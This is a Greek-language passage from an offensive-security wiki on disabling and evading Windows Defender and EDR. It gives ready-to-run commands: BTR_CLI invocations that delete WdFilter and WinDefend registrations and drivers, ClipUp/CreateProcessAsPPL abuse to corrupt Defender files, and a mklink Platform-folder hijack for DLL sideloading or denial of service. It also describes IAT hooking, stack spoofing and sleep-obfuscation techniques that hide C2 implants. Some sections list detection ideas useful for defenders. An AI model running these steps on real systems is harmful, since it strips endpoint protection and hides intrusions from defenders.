Για τις ενέργειες 5 και 6, ο διαχωριστής key/value στο wire είναι **δύο διαδοχικές ανάστροφες κάθετοι**· ένα path σε συμβατική μορφή δεν θα διαχωριστεί σωστά. Το feedback file αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε item μετατρέπονται στο `NTSTATUS` που προκύπτει. Για τις ενέργειες 1 και 2, οι οποίες δεν έχουν αρχικό πεδίο flags, το BTR μετακινεί το path στα τέσσερα δεσμευμένα τελικά byte, ώστε να δημιουργήσει χώρο για αυτό το status.<sup>[[36]](#references)</sup>

### Ροή εργασίας του `BTR_CLI` και παράθυρο πρώιμης εκκίνησης

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των `<random>.sys:changelist` και ενός feedback stream, σειριοποίηση/υπολογισμό checksum/κρυπτογράφηση chained actions, απευθείας δημιουργία του service registry key και, στη συνέχεια, κλήση του `NtLoadDriver` για `-trigger now` ή διατήρησή του ως system-start driver για `-trigger boot`. Η απευθείας προετοιμασία του registry παρακάμπτει τη συνηθισμένη διαδρομή SCM `CreateServiceW` και επομένως **δεν** δημιουργεί το Service Install Event ID 7045. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί λειτουργίες I/O αρχείων από το `DriverEntry` πριν να είναι έτοιμη η στοίβα αποθήκευσης και ο σύνδεσμος `SystemRoot`. Το `Start=1` σε συνδυασμό με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά προγράμματα οδήγησης ασφαλείας που ξεκινούν με το σύστημα και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Τα φίλτρα εκκίνησης, όπως το `WdFilter`, ενδέχεται να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα δυαδικά τους αρχεία ή τη διαμόρφωση των υπηρεσιών τους πριν από την επόμενη εκκίνηση και να διαγράψει τα εκτελέσιμα των υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν καλύπτει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση των boot-start και διαθέτει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC τοποθετεί ως πρόθεμα την Action 1 για το σταθερά καθορισμένο `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το αρχείο καταγραφής και, στη συνέχεια, εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την εκφόρτωσή του. Αυτό μειώνει τα αποδεικτικά στοιχεία, ενώ η τοποθέτηση των feedback στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του προγράμματος οδήγησης και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλής σημασίας

Οι κανόνες που βασίζονται μόνο στην υπογραφή και η λίστα αποκλεισμού ευάλωτων προγραμμάτων οδήγησης της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συσχετίσεις συμπεριφοράς, διακρίνοντας παράλληλα τη νόμιμη προέλευση του Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολικό χαρακτηριστικό του staging του BTR. Ένα ADS `.dat` συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender συνήθως τοποθετεί τα feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>` που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender` με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού προγράμματος οδήγησης BTR από προέλευση εκτός Defender με επακόλουθη διαγραφή αρχείου που αποδίδεται στο `System`/PID 4, ιδίως όταν πρόκειται για δυαδικά αρχεία ασφαλείας.
- **Sysmon 11 -> 23:** δημιουργήστε ειδοποίηση για την ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγχετε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Μια υπογραφή Microsoft από μόνη της δεν αρκεί ως ένδειξη εμπιστοσύνης όταν ένα πρόγραμμα οδήγησης εργαλείου ασφαλείας γίνεται staging από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για αλλοίωση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία υπογραφών/επιπέδων, ώστε μόνο διεργασίες με ίσο ή υψηλότερο επίπεδο προστασίας να μπορούν να αλλοιώσουν η μία την άλλη. Από επιθετική σκοπιά, αν μπορείτε να εκκινήσετε νόμιμα ένα δυαδικό αρχείο με ενεργοποιημένο PPL και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε αβλαβή λειτουργικότητα (π.χ. καταγραφή) σε έναν περιορισμένο μηχανισμό εγγραφής με υποστήριξη PPL, ο οποίος στοχεύει προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελείται μια διεργασία ως PPL
- Το EXE-στόχος (και τυχόν φορτωμένα DLL) πρέπει να είναι υπογεγραμμένα με EKU συμβατό με PPL.
- Η διεργασία πρέπει να δημιουργηθεί με `CreateProcess`, χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να αντιστοιχεί στην υπογραφή του δυαδικού αρχείου (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για υπογραφές anti-malware, `PROTECTION_LEVEL_WINDOWS` για υπογραφές Windows). Εσφαλμένα επίπεδα θα προκαλέσουν αποτυχία κατά τη δημιουργία.

Δείτε επίσης εδώ μια ευρύτερη εισαγωγή στα PP/PPL και στην προστασία του LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοιχτού κώδικα: CreateProcessAsPPL (επιλέγει το επίπεδο προστασίας και προωθεί τα ορίσματα στο EXE-στόχο):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` ξεκινά νέο αντίγραφο του εαυτού του και δέχεται παράμετρο για εγγραφή αρχείου καταγραφής σε διαδρομή που καθορίζει ο caller.
- Όταν εκτελείται ως διεργασία PPL, η εγγραφή του αρχείου γίνεται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε συνήθως προστατευμένες τοποθεσίες.

Βοηθητικά εργαλεία για σύντομες διαδρομές 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (αφηρημένη)
1) Εκκινήστε το LOLBIN που υποστηρίζει PPL (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Δώστε την παράμετρο διαδρομής αρχείου καταγραφής του ClipUp για να εξαναγκάσετε τη δημιουργία αρχείου σε προστατευμένο κατάλογο AV (π.χ., Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3, αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το αρχείο προορισμού όσο εκτελείται (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία auto-start που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με υποστήριξη PPL γίνεται πριν το AV κλειδώσει τα αρχεία του, καταστρέφοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνησή του.

Παράδειγμα κλήσης (οι διαδρομές έχουν αφαιρεθεί/συντομευτεί για λόγους ασφάλειας):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείς να ελέγξεις το περιεχόμενο που γράφει το ClipUp, παρά μόνο τη θέση του· αυτό το primitive είναι κατάλληλο για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα χρονικό περιθώριο για επανεκκίνηση.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα file locks.

Εντοπισμοί
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν η γονική διεργασία είναι μη τυπικός launcher, κατά την εκκίνηση.
- Νέες υπηρεσίες που έχουν ρυθμιστεί να εκκινούν αυτόματα ύποπτα binaries και ξεκινούν σταθερά πριν από το Defender/AV. Διερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binaries/τους καταλόγους Platform του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- Τηλεμετρία ETW/EDR: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από binaries που δεν σχετίζονται με AV.

Μετριασμοί
- WDAC/Code Integrity: περιορίστε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και με ποιες γονικές διεργασίες· αποκλείστε την εκτέλεση του ClipUp εκτός νόμιμων πλαισίων.
- Υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολουθείτε τον χειρισμό της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένα το tamper protection του Defender και οι προστασίες early-launch· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξετάστε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 στους τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

## Παραποίηση του Microsoft Defender μέσω Symlink Hijack του φακέλου έκδοσης Platform

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και, στη συνέχεια, εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας αντίστοιχα τις διαδρομές της υπηρεσίας/του μητρώου). Αυτή η επιλογή εμπιστεύεται τις καταχωρίσεις καταλόγου, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το αξιοποιήσει για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από επιτιθέμενο και να επιτύχει DLL sideloading ή διακοπή λειτουργίας της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας από το Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις καταχωρίσεις καταλόγου και επιλέγει τη μεγαλύτερη λεξικογραφικά έκδοση χωρίς να επαληθεύει ότι ο προορισμός οδηγεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοιμάστε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιούργησε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform, που να δείχνει στον φάκελό σου:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή της διεργασίας κάτω από το `C:\TMP\AV\` και τη ρύθμιση παραμέτρων της υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν την τοποθεσία.

Επιλογές Post-exploitation
- DLL sideloading/εκτέλεση κώδικα: Αποθέστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός υπηρεσίας/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτύχει να εκκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί δικαιώματα διαχειριστή.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι ομάδες Red Team μπορούν να μεταφέρουν το runtime evasion από το C2 implant στην ίδια τη μονάδα-στόχο, κάνοντας hooking στο Import Address Table (IAT) της και δρομολογώντας επιλεγμένα API μέσω κώδικα position-independent (PIC) που ελέγχεται από τον attacker. Έτσι, το evasion επεκτείνεται πέρα από το μικρό σύνολο API που εκθέτουν πολλά kits (π.χ. CreateProcessA) και παρέχει τις ίδιες προστασίες σε BOFs και DLL post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Σταδιοποιήστε ένα PIC blob μαζί με τη μονάδα-στόχο, χρησιμοποιώντας reflective loader (με προσθήκη στην αρχή ή ως συνοδευτικό αρχείο). Το PIC πρέπει να είναι αυτόνομο και position-independent.
- Καθώς φορτώνεται η DLL host, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR της και διορθώστε τις εγγραφές IAT για τις εισαγωγές-στόχους (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasion πριν καλέσει με tail-call την πραγματική διεύθυνση του API. Τα συνηθισμένα evasion περιλαμβάνουν:
  - Memory mask/unmask γύρω από την κλήση (π.χ. κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και επαναφορά μετά την κλήση.
  - Call-stack spoofing: κατασκευή ενός αβλαβούς stack και μετάβαση στο API-στόχο, ώστε η ανάλυση του call stack να καταλήγει στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για συμβατότητα, εξαγάγετε ένα interface, ώστε ένα script Aggressor (ή ισοδύναμο) να μπορεί να δηλώνει ποια API θα γίνει hook για το Beacon, τα BOFs και τις DLL post-exploitation.

Γιατί IAT hooking σε αυτή την περίπτωση
- Λειτουργεί με οποιονδήποτε κώδικα χρησιμοποιεί την εισαγωγή που έχει γίνει hook, χωρίς να τροποποιείται ο κώδικας των εργαλείων ή να βασίζεστε στο Beacon για να κάνει proxy συγκεκριμένα API.
- Καλύπτει DLL post-exploitation: το hooking στα LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στη φόρτωση μονάδων (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση εντολών post-exploitation που δημιουργούν διεργασίες, απέναντι σε detections που βασίζονται στο call stack, κάνοντας wrapper τα CreateProcessA/W.

Σύντομο σκελετό IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν hooking κατά τη διάρκεια του DllMain του φορτωμένου module.
- Κράτησε τα wrappers μικρά και ασφαλή για PIC· κάνε resolve το πραγματικό API μέσω της αρχικής τιμής IAT που κατέγραψες πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποίησε μεταβάσεις RW → RX για PIC και απόφυγε να αφήνεις σελίδες ταυτόχρονα writable και executable.

Stub για call-stack spoofing
- Τα PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και έπειτα κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδύασέ το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγεις μέσα στα αναμενόμενα frames πριν από το prologue του API.

Επιχειρησιακή ενσωμάτωση
- Πρόσθεσε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποίησε ένα Aggressor script για να δηλώσεις τα target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Θέματα Detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε PIC εκτός image· ασυνεπής προέλευση RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές εντός διεργασίας στην IAT, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, απρόσμενες RX περιοχές που δημιουργούνται κατά τη φόρτωση.
- Evasion φόρτωσης image: αν κάνεις hooking στα LoadLibrary*, παρακολούθησε ύποπτες φορτώσεις automation/clr assemblies σε συσχέτιση με συμβάντα masking μνήμης.

Σχετικά building blocks και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC stubs για call-stack spoofing (π.χ. Draugr)


## IAT Hooking κατά τη φόρτωση + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks κατά τη φόρτωση μέσω ενός resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hooking στα imports **κατά τη διάρκεια** του `ProcessImports()`, αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιούργησε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού ο transient loader PIC αποδεσμεύσει τη μνήμη του.
- Κάνε export μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παράλειψε τα ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως το `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά, κάνε delegate στο πραγματικό `GetProcAddress`.
- Δήλωσε τους στόχους των hooks κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **IAT redirection κατά τη φόρτωση**, χωρίς patching του code section του φορτωμένου DLL μετά τη φόρτωσή του.

### Επιβολή hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα hooks κατά τη φόρτωση ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στην IAT του στόχου. Αν ένα module κάνει resolve τα APIs μέσω PEB-walk + hash (χωρίς import entry), πρόσθεσε ένα πραγματικό import ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικατάστησε το hashed export resolution (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά όπως το `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την παρεμβολή όταν ο reflective loader κάνει resolve τα imports.

### Obfuscation αδράνειας/ύπνου τύπου Ekko χωρίς patching του `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook στα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τύλιξε την κλήση με μια αλυσίδα obfuscation τύπου Ekko που κρυπτογραφεί το image στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποίησε το `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν το `NtContinue` με προσαρμοσμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): όρισε το image σε `PAGE_READWRITE` → κρυπτογράφησε με RC4 μέσω του `advapi32!SystemFunction032` ολόκληρο το mapped image → εκτέλεσε την blocking αναμονή → αποκρυπτογράφησε με RC4 → **επανάφερε τα δικαιώματα ανά section** με περιήγηση στα PE sections → σηματοδότησε την ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποίησέ το σε πολλαπλά frames και όρισε registers (`Rip/Rcx/Rdx/R8/R9`) για να εκτελέσεις κάθε βήμα.

Επιχειρησιακή λεπτομέρεια: επέστρεψε “success” για μεγάλες αναμονές (π.χ., `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image είναι masked. Αυτό το μοτίβο κρύβει το module από scanners κατά τα διαστήματα αδράνειας και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Ιδέες για detection (με βάση την τηλεμετρία)
- Ριπές callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από custom επαναφορά δικαιωμάτων ανά section.

### Runtime καταχώριση CFG για gadgets sleep-obfuscation

Σε targets με ενεργοποιημένο CFG, το πρώτο indirect jump προς ένα mid-function gadget όπως το `jmp [rbx]` ή το `jmp rdi` συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να διατηρήσεις ενεργές τις αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Δήλωσε κάθε indirect destination που χρησιμοποιεί η αλυσίδα με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **πλήρες μέγεθος του image**.
- Για manually mapped/PIC/stomped περιοχές, χρησιμοποίησε αντί γι’ αυτό το **allocation base** και το μέγεθος της allocation.
- Σήμανε όχι μόνο το dispatch gadget, αλλά και τα exports στα οποία γίνεται έμμεση πρόσβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και κάθε εκτελέσιμο section που ελέγχει ο επιτιθέμενος και θα αποτελέσει indirect target.

Έτσι οι αλυσίδες ύπνου τύπου ROP/JOP μετατρέπονται από «λειτουργεί μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν μεταγλωττιστεί με `/guard:cf`.

### CET-safe stack spoofing για threads σε ύπνο

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε συστήματα CET Shadow Stack, επειδή το spoofed `Rip` πρέπει και πάλι να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι:<sup>[[30]](#references)</sup>

- Επίλεξε ένα άλλο thread στην ίδια διεργασία και διάβασε τα όρια stack του `NT_TIB` / TEB του (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Κράτησε αντίγραφο του πραγματικού TEB/TIB του τρέχοντος thread.
- Κατέγραψε το πραγματικό context του thread που βρίσκεται σε ύπνο με το `GetThreadContext`.
- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα το spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του παραθύρου ύπνου, αντέγραψε το `NT_TIB` του spoof thread στο TEB του τρέχοντος thread, ώστε οι stack walkers να κάνουν unwind μέσα σε ένα νόμιμο εύρος stack.
- Αφού ολοκληρωθεί η αναμονή, επανάφερε το αρχικό TIB και thread context.

Έτσι διατηρείται ένα instruction pointer συμβατό με CET, ενώ παραπλανώνται οι EDR stack walkers που εμπιστεύονται τα metadata stack του TEB για να επικυρώσουν τα unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch μέσω timer-queue έχει υπερβολικά αναγνωρίσιμο signature, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:<sup>[[27]](#references)</sup>

- Δημιούργησε ένα helper thread με entrypoint το `NtTestAlert`.
- Πρόσθεσε στην ουρά προετοιμασμένα `CONTEXT` frames/APCs με το `NtQueueApcThread` και εκτέλεσέ τα με το `NtAlertResumeThread`.
- Αποθήκευσε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να μην εξαντληθεί το προεπιλεγμένο stack thread των 64 KB.
- Χρησιμοποίησε το `NtSignalAndWaitForSingleObject` για να σηματοδοτήσεις ατομικά το start event και να μπλοκάρεις.
- Ανέστειλε το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να περιορίσεις το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που έχει αποκατασταθεί μόνο εν μέρει.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με signature helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` σε συνδυασμό με `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
